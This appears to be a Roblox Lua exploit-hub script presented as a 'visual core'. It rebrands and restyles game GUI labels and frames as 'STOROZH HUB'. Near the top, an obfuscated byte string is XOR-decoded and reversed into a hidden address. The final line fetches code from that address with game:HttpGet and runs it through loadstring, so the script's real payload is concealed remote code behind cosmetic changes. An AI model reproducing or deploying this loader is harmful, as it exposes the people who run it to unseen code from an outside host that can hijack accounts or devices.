
--[[ STAGE 2: VISUAL CORE ]]
local e2rMQXcG5dRh7GhlhNzg="\183\210\192\005\027\034\049\235\063\072\075\081\053\022\023\045\059\040\099\102\086\066\101\101\128\144\104\108\140\134\172\186\155\151\157\167\172\212\235\204\205\218\213\019\021\245\242\000\020\048\063\075\061\100\042\048\063\066\135\079\086\098\123\102\117\118\146\137\205\157\175\161\175\178\193\192\203\203\211\217\033\234\239\250\060\029\010\028\050\031\039\050\072\070\087\100\084\114\092\127\107\124\186\154\143\163\215\222\240\192\200\211\218\197"local Tx0HOUAWkD6h57d=106 local bQthpcfhcD3CZEV=144 local pp_0lUVveKEy86G=0 local NW6qiNzHhVvcXrWenO=7 local A_W3_VH2sSah7=21 local OuaCV82J_G7u=true local dYQKZtSm911jOqhD=bit32 and bit32.bxor if not dYQKZtSm911jOqhD then dYQKZtSm911jOqhD=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local AXyEUEA3Hh2i4wxX_V={}for AjHWNiUbADP_9=1,#e2rMQXcG5dRh7GhlhNzg do local j1HY03i6EIqY4Cq=string.byte(e2rMQXcG5dRh7GhlhNzg,AjHWNiUbADP_9)local Fr6ivou_ig23MuxgaV7I=(bQthpcfhcD3CZEV+(AjHWNiUbADP_9*NW6qiNzHhVvcXrWenO)+A_W3_VH2sSah7)%256 if pp_0lUVveKEy86G==0 then j1HY03i6EIqY4Cq=(j1HY03i6EIqY4Cq-Fr6ivou_ig23MuxgaV7I)%256 AXyEUEA3Hh2i4wxX_V[AjHWNiUbADP_9]=string.char(dYQKZtSm911jOqhD(j1HY03i6EIqY4Cq,Tx0HOUAWkD6h57d))else j1HY03i6EIqY4Cq=dYQKZtSm911jOqhD(j1HY03i6EIqY4Cq,Tx0HOUAWkD6h57d)AXyEUEA3Hh2i4wxX_V[AjHWNiUbADP_9]=string.char((j1HY03i6EIqY4Cq-Fr6ivou_ig23MuxgaV7I)%256)end end local Ub_zKJdIDFo5vxlCiNRU4=table.concat(AXyEUEA3Hh2i4wxX_V)if OuaCV82J_G7u then Ub_zKJdIDFo5vxlCiNRU4=string.reverse(Ub_zKJdIDFo5vxlCiNRU4)end local _9knwdiVmOo4hvMy0XQ=Ub_zKJdIDFo5vxlCiNRU4
local HubName = "STOROZH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(_9knwdiVmOo4hvMy0XQ))()
